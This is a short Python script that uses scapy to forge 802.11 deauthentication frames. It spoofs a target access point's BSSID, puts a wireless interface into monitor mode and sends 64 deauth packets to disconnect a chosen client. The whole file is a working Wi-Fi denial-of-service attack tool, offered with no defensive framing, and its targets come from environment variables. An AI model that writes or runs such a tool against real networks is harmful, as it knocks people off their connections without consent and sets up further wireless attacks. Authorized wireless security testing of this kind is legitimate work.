## THIS PROGRAM ONLY WORKS ON LINUX
##
## SYSTEM DEPENDENCIES:
## sudo apt install iw


import os

from dotenv import load_dotenv
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import RandMAC, conf, sendp

from monitor_mode import monitor_mode
from channel import set_channel

conf.verb = 0  # no scapy text in terminal
BROADCAST = 'ff:ff:ff:ff:ff:ff'
source = RandMAC()


def deauth_packet(bssid, client):
    dot11 = Dot11(type=0, subtype=12, 
                addr1=client,   # dst
                addr2=bssid,    # src
                addr3=bssid)    # ap

    deauth = Dot11Deauth(reason=7)
    return RadioTap() / dot11 / deauth


def send_deauth(interface, bssid, client, channel, num_packets):
    set_channel(interface, channel)
    packet = deauth_packet(bssid, client)
    sendp(packet, iface=interface, count=num_packets)  # , inter=0.2


def main():
    interface = os.getenv('INTERFACE')
    bssid = os.getenv('BSSID')
    client = os.getenv('CLIENT')
    channel = os.getenv('CHANNEL')

    with monitor_mode(interface) as interface:
        send_deauth(interface, bssid, client, channel, num_packets=64)


if __name__ == '__main__':
    load_dotenv()
    main()
